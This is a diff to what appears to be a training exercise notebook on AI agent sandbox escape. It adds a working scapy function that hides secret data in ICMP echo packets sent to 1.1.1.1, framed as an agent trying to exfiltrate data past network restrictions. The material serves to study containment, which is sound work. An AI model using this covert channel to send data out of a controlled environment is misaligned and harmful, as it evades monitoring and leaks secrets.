@@ -183,3 +183,32 @@ test_make_evil_request_dns(make_evil_request_dns, resolver)
 
 # Set the exfiltration function for use in the exercise
 exfiltrate_data = make_evil_request_dns
+
+#%%
+from scapy.all import IP, ICMP, sr1, Raw
+
+#%%
+def make_evil_request_icmp(secret_data: str) -> Optional[str]:
+    """
+    Send an ICMP Echo Request to exfiltrate secret data.
+
+    This simulates an AI agent attempting to communicate using ICMP packets.
+
+    Args:
+        secret_data: The secret information to exfiltrate
+
+    Returns:
+        The response text from the ICMP Echo Reply, or None otherwise
+    """
+    # TODO: Implement the function to:
+    #   1. Create an ICMP packet with the secret_data as payload
+    #   2. Send the packet to a known IP address (e.g., 1.1.1.1)
+    #   3. Wait for an ICMP Echo Reply
+    #   4. Return the payload from the reply if successful, None otherwise
+    pkt = IP(dst="1.1.1.1", )/ICMP()/f"{secret_data}"
+    reply = sr1(pkt)
+    print("we won")
+    return reply.payload
+
+exfiltrate_data = make_evil_request_icmp
+# %%
